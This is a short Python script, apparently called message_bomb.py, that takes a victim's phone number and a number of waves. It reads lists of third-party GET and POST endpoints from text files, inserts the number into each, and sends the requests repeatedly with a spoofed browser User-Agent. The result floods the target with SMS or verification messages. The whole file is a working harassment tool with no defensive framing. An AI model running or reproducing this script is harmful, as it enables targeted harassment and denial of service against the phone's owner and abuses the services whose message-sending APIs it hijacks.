import requests
import time
import sys

failed_api_list = []
delay=0.5
api_get_file = open('api_get.txt','r',encoding='utf-8')
api_post_file = open('api_post.txt','r',encoding='utf-8')
api_failed_file = open('api_failed.txt','a',encoding='utf-8')
try:
    phone_num = sys.argv[1]
    waves = int(sys.argv[2])
except:
    print('python message_bomb.py [phone_number] [waves]')
    sys.exit()
api_get_lines = api_get_file.readlines()
api_post_lines = api_post_file.readlines()
headers = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0) Gecko/20100101 Firefox/6.0'}
for wave in range(waves):
    print('This is the',wave+1,'of attacks.')
    for api in api_get_lines:
        try:
            r = requests.get(api.strip('\n').replace('whoami',phone_num),headers=headers)
            time.sleep(delay)
        except:
            if api not in failed_api_list:
                print(api,end='')
                failed_api_list.append(api)
    for api in api_post_lines:
        try:
            url = api.strip('\n').replace('whoami', phone_num).split('  ')[0]
            data_list = api.strip('\n').replace('whoami', phone_num).split('  ')[1].split('&')
            dic = {}
            for data in data_list:
                dic[data.split('=')[0]] = data.split('=')[1]
            r = requests.post(url=url,data=dic,headers=headers)
            time.sleep(delay)
        except:
            if api not in failed_api_list:
                print('Connect Failed:',api,end='')
                failed_api_list.append(api)
for api in failed_api_list:
    api_failed_file.write(api)
api_failed_file.close()
